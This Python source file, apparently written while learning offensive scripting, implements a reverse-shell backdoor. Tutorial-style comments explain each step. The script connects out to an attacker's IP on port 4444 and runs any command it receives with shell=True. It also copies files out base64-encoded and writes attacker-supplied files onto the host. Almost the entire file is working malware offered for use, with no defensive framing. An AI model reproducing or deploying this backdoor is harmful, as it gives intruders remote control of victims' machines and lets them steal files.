#!usr/bin/env python

import socket
import subprocess, base64
import json, os

# base 64 is a module which converts unidentified letters
# into known letters using b64encode function
# and then decodes it using b64decode function

class Backdoor:
    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # we are sending through tcp
        # we are streaming the data through pipelines not sending as messages
        # socket class will open the socket
        # we will pass the family (AF_INET) first
        # and we pass the socket type
        self.conn.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data)
        # this function will take the data, and convert it
        # dumps function will convert the data into a json object
        # and we will send it normally

    def reliable_reciev(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(1024)
                # here we are accessing the data save it in buffer
                # of size 1024 and if exception
                # arises(bcz data exceeded the buffer size)
                # hence we will continue to execute the try statements
                # and inc the buffer by another 1024
                return json.loads(json_data)
            except ValueError:
                continue
                # this function will receive the jason data through normal recv method
                # loads function will unwraps the received data
                # and return it in normal format

    def esys_cm(self, command):
        return subprocess.check_output(command, shell=True)

    def change_wrkng_directory(self, path):
        os.chdir(path)
        return " changing working directory to --> " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "\n..upload successful"
            # this function will get triggered when command contains download
            # it will access the path then access the content in the file
            # then create a file with same name then
            # convert  the content in it and write the content in the created file

    def run(self):
        while True:
            try:
                comand = self.reliable_reciev()
                # 1024 is the buffer size we are gonna recieve
                if comand[0] == "exit":
                    self.conn.close()
                    exit()
                # this will check if input is exit then it will exit from the prog.
                # next we will check if there is somthng after cd
                # then we will execute that and change the directory
                elif comand[0] == "cd" and len(comand) > 1:
                    result = self.change_wrkng_directory(comand[1])

                elif comand[0] in ["download", "Download"]:
                    result = self.read_file(comand[1])

                elif comand[0] in ["upload", "Upload"]:
                    result = self.write_file(comand[1], comand[2])

                else:
                    result = self.esys_cm(comand)

            except Exception:
                subprocess.call("clear", shell=True)# this is only for linux
                result = "\n!!!-- error during command execution"

            self.reliable_send(result)

my_back = Backdoor("0.0.0.0", 4444)# replace 0.0.0.0 with attacker's ip
my_back.run()
